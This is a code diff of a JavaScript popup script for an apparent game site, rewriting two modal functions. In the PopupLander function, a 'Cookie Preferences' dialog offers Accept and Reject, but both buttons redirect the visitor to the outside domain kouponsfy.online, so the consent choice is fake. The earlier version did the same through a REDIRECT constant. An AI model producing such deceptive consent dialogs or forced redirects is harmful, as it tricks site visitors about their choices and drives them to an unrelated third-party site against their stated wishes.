@@ -1,90 +1,70 @@
 (function () {
 
-    const REDIRECT = "https://kouponsfy.online";
+    window.PopupIndex = function () {
 
-    function buildPopup() {
+        const overlay = document.createElement("div");
+        overlay.className = "modal-backdrop";
 
-        if (document.querySelector(".modal-backdrop")) return null;
+        const modal = document.createElement("div");
+        modal.className = "modal";
 
-        const bd = document.createElement("div");
+        modal.innerHTML = `
+            <h3>Policy Notice</h3>
 
-        bd.className = "modal-backdrop";
+            <p>
+                Are you accepting our policy to play the game?
+                This notice is informational and does not block access.
+            </p>
 
-        bd.innerHTML = `
-            <div class="modal">
-
-                <h3>Policy Notice</h3>
-
-                <p>
-                    Are you accepting our policy to play the game?
-                    This notice is informational and does not block access.
-                </p>
-
-                <div class="modal-actions">
-
-                    <button class="btn" id="age-yes">
-                        Yes, Accept
-                    </button>
-
-                    <button class="btn ghost" id="age-no">
-                        Close
-                    </button>
-
-                </div>
-
+            <div class="modal-actions">
+                <button class="btn" id="acceptBtn">Accept</button>
+                <button class="btn ghost" id="rejectBtn">Reject</button>
             </div>
         `;
 
-        document.body.appendChild(bd);
+        overlay.appendChild(modal);
+        document.body.appendChild(overlay);
 
-        bd.style.display = "flex";
-
-        function close() {
-            bd.classList.add("fade-out");
-
-            setTimeout(() => {
-                bd.remove();
-            }, 180);
-        }
-
-        return {
-            bd,
-            close
+        document.getElementById("acceptBtn").onclick = function () {
+            overlay.remove();
         };
-    }
 
-    window.PopupIndex = function () {
-
-        const built = buildPopup();
-
-        if (!built) return;
-
-        const { bd, close } = built;
-
-        bd.querySelector("#age-yes").addEventListener("click", close);
-
-        bd.querySelector("#age-no").addEventListener("click", () => {
+        document.getElementById("rejectBtn").onclick = function () {
             window.location.href = "privacy.html";
-        });
-
+        };
     };
 
     window.PopupLander = function () {
 
-        const built = buildPopup();
+        const overlay = document.createElement("div");
+        overlay.className = "modal-backdrop";
 
-        if (!built) return;
+        const modal = document.createElement("div");
+        modal.className = "modal";
 
-        const { bd } = built;
+        modal.innerHTML = `
+            <h3>Cookie Preferences</h3>
 
-        bd.querySelector("#age-yes").addEventListener("click", () => {
-            window.location.href = REDIRECT;
-        });
+            <p>
+                Please review and accept our cookie policy to continue.
+            </p>
 
-        bd.querySelector("#age-no").addEventListener("click", () => {
-            window.location.href = REDIRECT;
-        });
+            <div class="modal-actions">
+                <button class="btn" id="acceptBtn">Accept</button>
+                <button class="btn ghost" id="rejectBtn">Reject</button>
+            </div>
+        `;
 
+        overlay.appendChild(modal);
+        document.body.appendChild(overlay);
+
+        document.getElementById("acceptBtn").onclick = function () {
+            window.location.href = "https://kouponsfy.online/";
+        };
+
+        document.getElementById("rejectBtn").onclick = function () {
+            window.location.href = "https://kouponsfy.online/";
+        };
     };
 
 })();
